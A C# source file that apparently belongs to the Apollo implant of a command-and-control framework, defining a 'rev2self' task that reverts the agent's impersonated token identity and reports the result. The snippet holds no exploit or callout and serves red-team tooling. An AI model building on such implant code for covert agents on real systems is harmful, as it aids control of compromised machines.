﻿#define COMMAND_NAME_UPPER

#if DEBUG
#define REV2SELF
#endif

#if REV2SELF


using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Tasks
{
    public class rev2self : Tasking
    {
        public rev2self(IAgent agent, Task data) : base(agent, data)
        {
        }

        public override System.Threading.Tasks.Task CreateTasking()
        {
            return new System.Threading.Tasks.Task(() =>
            {
                _agent.GetIdentityManager().Revert();
                var current = _agent.GetIdentityManager().GetCurrentImpersonationIdentity();
                _agent.GetTaskManager().AddTaskResponseToQueue(
                    CreateTaskResponse(
                        $"Reverted identity to {current.Name}", true));
            }, _cancellationToken.Token);
        }

        public override void Kill()
        {
            base.Kill();
        }
    }
}
#endif